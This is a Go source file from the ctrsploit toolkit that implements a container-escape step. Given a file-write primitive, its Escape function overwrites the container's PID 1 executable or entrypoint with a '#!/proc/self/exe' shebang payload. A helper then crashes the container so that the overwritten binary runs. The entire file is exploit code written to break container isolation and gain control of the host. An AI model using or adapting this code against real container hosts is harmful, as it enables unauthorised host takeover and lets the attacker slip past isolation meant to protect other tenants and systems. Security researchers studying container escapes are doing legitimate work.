package pipe_primitive

import (
	"github.com/ctrsploit/ctrsploit/helper/crash"
	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
)

func Escape(primitive Primitive) (err error) {
	err = WriteImageEntrypointAsSelf(primitive)
	if err != nil {
		return
	}
	return
}

func WriteImageEntrypointAsSelf(primitive Primitive) error {
	return WriteImageEntrypoint(primitive, []byte("#!/proc/self/exe"))
}

func WriteImageEntrypoint(primitive Primitive, payload []byte) (err error) {
	//path, err := util.GetProcessPathByPid(1)
	//if err != nil {
	//	if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
	//		awesome_error.CheckErr(err)
	//	}
	//	return nil
	//}
	path := "/proc/1/exe"
	shebang, err := internal.IsSheBang(1)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if shebang {
		comm, err := os.ReadFile("/proc/1/comm")
		if err != nil {
			awesome_error.CheckErr(err)
			return err
		}
		path = string(comm)
	}
	return WriteImage(primitive, string(path), payload)
}

func makeCrash() (err error) {
	return crash.MakeContainerCrash(crash.NewSig())
}
